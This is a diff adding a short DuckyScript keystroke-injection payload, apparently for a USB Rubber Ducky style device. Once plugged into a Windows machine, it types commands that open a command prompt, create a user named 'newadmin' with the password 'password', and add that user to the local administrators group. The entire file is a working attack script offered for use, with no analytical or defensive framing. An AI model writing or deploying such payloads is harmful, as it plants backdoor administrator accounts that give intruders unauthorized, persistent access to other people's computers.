@@ -1,0 +1,25 @@
+REM
+REM Script to create a new user
+REM 	   USERNAME: newadmin
+REM	   PASSWORD: password
+REM Str1ck9
+REM
+
+
+REM Open Command Prompt
+DELAY 500
+GUI r
+DELAY 500
+STRING cmd
+DELAY 500
+ENTER
+DELAY 1000
+STRING net user newadmin password /add
+ENTER
+DELAY 500
+STRING net localgroup administrators newadmin /add
+ENTER
+DELAY 500
+STRING exit
+ENTER
+
